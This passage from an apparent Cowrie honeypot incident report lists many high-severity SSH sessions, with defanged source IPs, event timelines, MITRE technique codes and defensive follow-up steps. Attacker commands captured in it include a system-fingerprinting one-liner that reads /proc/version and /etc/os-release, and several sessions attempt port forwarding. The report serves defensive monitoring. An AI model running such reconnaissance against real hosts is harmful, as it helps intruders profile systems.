| `2026-08-16 02:06:30` | `cowrie.client.version` |
| `2026-08-16 02:06:30` | `cowrie.client.kex` |
| `2026-08-16 02:06:33` | `cowrie.login.success` |
| `2026-08-16 02:06:36` | `cowrie.session.params` |
| `2026-08-16 02:06:36` | `cowrie.command.input` |
| `2026-08-16 02:06:36` | `cowrie.command.input` |
| `2026-08-16 02:06:36` | `cowrie.command.input` |
| `2026-08-16 02:06:36` | `cowrie.command.input` |
| `2026-08-16 02:06:36` | `cowrie.command.input` |
| `2026-08-16 02:06:36` | `cowrie.command.success` |
| `2026-08-16 02:06:36` | `cowrie.command.input` |
| `2026-08-16 02:06:36` | `cowrie.command.input` |
| `2026-08-16 02:06:36` | `cowrie.command.input` |
| `2026-08-16 02:06:36` | `cowrie.command.input` |
| `2026-08-16 02:06:36` | `cowrie.log.closed` |
| `2026-08-16 02:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87b738014f6f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:07 |
| **Last Seen** | 2026-08-16 02:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:07:26` | `cowrie.session.connect` |
| `2026-08-16 02:07:27` | `cowrie.client.version` |
| `2026-08-16 02:07:27` | `cowrie.client.kex` |
| `2026-08-16 02:07:30` | `cowrie.login.success` |
| `2026-08-16 02:07:32` | `cowrie.session.params` |
| `2026-08-16 02:07:32` | `cowrie.command.input` |
| `2026-08-16 02:07:32` | `cowrie.command.input` |
| `2026-08-16 02:07:32` | `cowrie.command.input` |
| `2026-08-16 02:07:32` | `cowrie.command.input` |
| `2026-08-16 02:07:32` | `cowrie.command.input` |
| `2026-08-16 02:07:32` | `cowrie.command.success` |
| `2026-08-16 02:07:32` | `cowrie.command.input` |
| `2026-08-16 02:07:32` | `cowrie.command.input` |
| `2026-08-16 02:07:32` | `cowrie.command.input` |
| `2026-08-16 02:07:32` | `cowrie.command.input` |
| `2026-08-16 02:07:33` | `cowrie.log.closed` |
| `2026-08-16 02:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3daec6a7e1ba

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-16 02:07 |
| **Last Seen** | 2026-08-16 02:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:07:39` | `cowrie.session.connect` |
| `2026-08-16 02:07:39` | `cowrie.client.version` |
| `2026-08-16 02:07:39` | `cowrie.client.kex` |
| `2026-08-16 02:07:39` | `cowrie.login.success` |
| `2026-08-16 02:07:39` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:07:40` | `cowrie.direct-tcpip.data` |
| `2026-08-16 02:07:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81bd3506d659

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:08 |
| **Last Seen** | 2026-08-16 02:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:08:22` | `cowrie.session.connect` |
| `2026-08-16 02:08:23` | `cowrie.client.version` |
| `2026-08-16 02:08:24` | `cowrie.client.kex` |
| `2026-08-16 02:08:27` | `cowrie.login.success` |
| `2026-08-16 02:08:29` | `cowrie.session.params` |
| `2026-08-16 02:08:29` | `cowrie.command.input` |
| `2026-08-16 02:08:29` | `cowrie.command.input` |
| `2026-08-16 02:08:29` | `cowrie.command.input` |
| `2026-08-16 02:08:29` | `cowrie.command.input` |
| `2026-08-16 02:08:29` | `cowrie.command.input` |
| `2026-08-16 02:08:29` | `cowrie.command.success` |
| `2026-08-16 02:08:29` | `cowrie.command.input` |
| `2026-08-16 02:08:29` | `cowrie.command.input` |
| `2026-08-16 02:08:29` | `cowrie.command.input` |
| `2026-08-16 02:08:29` | `cowrie.command.input` |
| `2026-08-16 02:08:30` | `cowrie.log.closed` |
| `2026-08-16 02:08:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-031ee94aa2a7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:09 |
| **Last Seen** | 2026-08-16 02:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:09:21` | `cowrie.session.connect` |
| `2026-08-16 02:09:22` | `cowrie.client.version` |
| `2026-08-16 02:09:22` | `cowrie.client.kex` |
| `2026-08-16 02:09:26` | `cowrie.login.success` |
| `2026-08-16 02:09:28` | `cowrie.session.params` |
| `2026-08-16 02:09:28` | `cowrie.command.input` |
| `2026-08-16 02:09:28` | `cowrie.command.input` |
| `2026-08-16 02:09:28` | `cowrie.command.input` |
| `2026-08-16 02:09:28` | `cowrie.command.input` |
| `2026-08-16 02:09:28` | `cowrie.command.input` |
| `2026-08-16 02:09:28` | `cowrie.command.success` |
| `2026-08-16 02:09:28` | `cowrie.command.input` |
| `2026-08-16 02:09:28` | `cowrie.command.input` |
| `2026-08-16 02:09:28` | `cowrie.command.input` |
| `2026-08-16 02:09:28` | `cowrie.command.input` |
| `2026-08-16 02:09:29` | `cowrie.log.closed` |
| `2026-08-16 02:09:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eee7026838a8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:10 |
| **Last Seen** | 2026-08-16 02:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:10:20` | `cowrie.session.connect` |
| `2026-08-16 02:10:21` | `cowrie.client.version` |
| `2026-08-16 02:10:21` | `cowrie.client.kex` |
| `2026-08-16 02:10:26` | `cowrie.login.success` |
| `2026-08-16 02:10:28` | `cowrie.session.params` |
| `2026-08-16 02:10:28` | `cowrie.command.input` |
| `2026-08-16 02:10:28` | `cowrie.command.input` |
| `2026-08-16 02:10:28` | `cowrie.command.input` |
| `2026-08-16 02:10:28` | `cowrie.command.input` |
| `2026-08-16 02:10:28` | `cowrie.command.input` |
| `2026-08-16 02:10:28` | `cowrie.command.success` |
| `2026-08-16 02:10:28` | `cowrie.command.input` |
| `2026-08-16 02:10:28` | `cowrie.command.input` |
| `2026-08-16 02:10:28` | `cowrie.command.input` |
| `2026-08-16 02:10:28` | `cowrie.command.input` |
| `2026-08-16 02:10:29` | `cowrie.log.closed` |
| `2026-08-16 02:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b57a933f8870

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:11 |
| **Last Seen** | 2026-08-16 02:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:11:17` | `cowrie.session.connect` |
| `2026-08-16 02:11:17` | `cowrie.client.version` |
| `2026-08-16 02:11:17` | `cowrie.client.kex` |
| `2026-08-16 02:11:18` | `cowrie.login.success` |
| `2026-08-16 02:11:20` | `cowrie.session.params` |
| `2026-08-16 02:11:20` | `cowrie.command.input` |
| `2026-08-16 02:11:20` | `cowrie.command.input` |
| `2026-08-16 02:11:20` | `cowrie.command.input` |
| `2026-08-16 02:11:20` | `cowrie.command.input` |
| `2026-08-16 02:11:20` | `cowrie.command.input` |
| `2026-08-16 02:11:20` | `cowrie.command.success` |
| `2026-08-16 02:11:20` | `cowrie.command.input` |
| `2026-08-16 02:11:20` | `cowrie.command.input` |
| `2026-08-16 02:11:20` | `cowrie.command.input` |
| `2026-08-16 02:11:20` | `cowrie.command.input` |
| `2026-08-16 02:11:21` | `cowrie.log.closed` |
| `2026-08-16 02:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ac2c1c0906d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:12 |
| **Last Seen** | 2026-08-16 02:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:12:15` | `cowrie.session.connect` |
| `2026-08-16 02:12:16` | `cowrie.client.version` |
| `2026-08-16 02:12:16` | `cowrie.client.kex` |
| `2026-08-16 02:12:21` | `cowrie.login.success` |
| `2026-08-16 02:12:23` | `cowrie.session.params` |
| `2026-08-16 02:12:23` | `cowrie.command.input` |
| `2026-08-16 02:12:23` | `cowrie.command.input` |
| `2026-08-16 02:12:23` | `cowrie.command.input` |
| `2026-08-16 02:12:23` | `cowrie.command.input` |
| `2026-08-16 02:12:23` | `cowrie.command.input` |
| `2026-08-16 02:12:23` | `cowrie.command.success` |
| `2026-08-16 02:12:23` | `cowrie.command.input` |
| `2026-08-16 02:12:23` | `cowrie.command.input` |
| `2026-08-16 02:12:23` | `cowrie.command.input` |
| `2026-08-16 02:12:23` | `cowrie.command.input` |
| `2026-08-16 02:12:24` | `cowrie.log.closed` |
| `2026-08-16 02:12:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38d883c2ca64

| Field | Detail |
|---|---|
| **Source IP** | `117.211.15[.]106` |
| **First Seen** | 2026-08-16 02:12 |
| **Last Seen** | 2026-08-16 02:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:12:56` | `cowrie.session.connect` |
| `2026-08-16 02:12:57` | `cowrie.client.version` |
| `2026-08-16 02:12:57` | `cowrie.client.kex` |
| `2026-08-16 02:12:59` | `cowrie.login.success` |
| `2026-08-16 02:13:00` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.15[.]106` to AbuseIPDB if not already reported
- [ ] Block `117.211.15[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaac43daf40f

| Field | Detail |
|---|---|
| **Source IP** | `94.205.250[.]78` |
| **First Seen** | 2026-08-16 02:13 |
| **Last Seen** | 2026-08-16 02:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:13:06` | `cowrie.session.connect` |
| `2026-08-16 02:13:07` | `cowrie.client.version` |
| `2026-08-16 02:13:07` | `cowrie.client.kex` |
| `2026-08-16 02:13:09` | `cowrie.login.success` |
| `2026-08-16 02:13:10` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:13:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.205.250[.]78` to AbuseIPDB if not already reported
- [ ] Block `94.205.250[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46246ef96a4f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:13 |
| **Last Seen** | 2026-08-16 02:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:13:12` | `cowrie.session.connect` |
| `2026-08-16 02:13:13` | `cowrie.client.version` |
| `2026-08-16 02:13:13` | `cowrie.client.kex` |
| `2026-08-16 02:13:17` | `cowrie.login.success` |
| `2026-08-16 02:13:20` | `cowrie.session.params` |
| `2026-08-16 02:13:20` | `cowrie.command.input` |
| `2026-08-16 02:13:20` | `cowrie.command.input` |
| `2026-08-16 02:13:20` | `cowrie.command.input` |
| `2026-08-16 02:13:20` | `cowrie.command.input` |
| `2026-08-16 02:13:20` | `cowrie.command.input` |
| `2026-08-16 02:13:20` | `cowrie.command.success` |
| `2026-08-16 02:13:20` | `cowrie.command.input` |
| `2026-08-16 02:13:20` | `cowrie.command.input` |
| `2026-08-16 02:13:20` | `cowrie.command.input` |
| `2026-08-16 02:13:20` | `cowrie.command.input` |
| `2026-08-16 02:13:21` | `cowrie.log.closed` |
| `2026-08-16 02:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41157dbff503

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:14 |
| **Last Seen** | 2026-08-16 02:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:14:10` | `cowrie.session.connect` |
| `2026-08-16 02:14:11` | `cowrie.client.version` |
| `2026-08-16 02:14:11` | `cowrie.client.kex` |
| `2026-08-16 02:14:14` | `cowrie.login.success` |
| `2026-08-16 02:14:16` | `cowrie.session.params` |
| `2026-08-16 02:14:16` | `cowrie.command.input` |
| `2026-08-16 02:14:16` | `cowrie.command.input` |
| `2026-08-16 02:14:16` | `cowrie.command.input` |
| `2026-08-16 02:14:16` | `cowrie.command.input` |
| `2026-08-16 02:14:16` | `cowrie.command.input` |
| `2026-08-16 02:14:16` | `cowrie.command.success` |
| `2026-08-16 02:14:16` | `cowrie.command.input` |
| `2026-08-16 02:14:16` | `cowrie.command.input` |
| `2026-08-16 02:14:16` | `cowrie.command.input` |
| `2026-08-16 02:14:16` | `cowrie.command.input` |
| `2026-08-16 02:14:17` | `cowrie.log.closed` |
| `2026-08-16 02:14:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-228562cd456a

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 02:14 |
| **Last Seen** | 2026-08-16 02:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:14:36` | `cowrie.session.connect` |
| `2026-08-16 02:14:36` | `cowrie.client.version` |
| `2026-08-16 02:14:38` | `cowrie.client.kex` |
| `2026-08-16 02:14:38` | `cowrie.login.success` |
| `2026-08-16 02:14:39` | `cowrie.session.params` |
| `2026-08-16 02:14:39` | `cowrie.command.input` |
| `2026-08-16 02:14:39` | `cowrie.log.closed` |
| `2026-08-16 02:14:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84dd63652239

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 02:14 |
| **Last Seen** | 2026-08-16 02:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:14:45` | `cowrie.session.connect` |
| `2026-08-16 02:14:45` | `cowrie.client.version` |
| `2026-08-16 02:14:45` | `cowrie.client.kex` |
| `2026-08-16 02:14:45` | `cowrie.login.success` |
| `2026-08-16 02:14:46` | `cowrie.session.params` |
| `2026-08-16 02:14:46` | `cowrie.command.input` |
| `2026-08-16 02:14:47` | `cowrie.log.closed` |
| `2026-08-16 02:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88e338ae95c0

| Field | Detail |
|---|---|
| **Source IP** | `120.198.138[.]185` |
| **First Seen** | 2026-08-16 02:14 |
| **Last Seen** | 2026-08-16 02:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:14:47` | `cowrie.session.connect` |
| `2026-08-16 02:14:48` | `cowrie.client.version` |
| `2026-08-16 02:14:48` | `cowrie.client.kex` |
| `2026-08-16 02:14:51` | `cowrie.login.success` |
| `2026-08-16 02:14:52` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.198.138[.]185` to AbuseIPDB if not already reported
- [ ] Block `120.198.138[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d48e1a6de8b

| Field | Detail |
|---|---|
| **Source IP** | `218.29.231[.]106` |
| **First Seen** | 2026-08-16 02:14 |
| **Last Seen** | 2026-08-16 02:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:14:57` | `cowrie.session.connect` |
| `2026-08-16 02:14:58` | `cowrie.client.version` |
| `2026-08-16 02:14:58` | `cowrie.client.kex` |
| `2026-08-16 02:15:00` | `cowrie.login.success` |
| `2026-08-16 02:15:01` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:15:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.29.231[.]106` to AbuseIPDB if not already reported
- [ ] Block `218.29.231[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f817b55ce4ed

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:15 |
| **Last Seen** | 2026-08-16 02:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
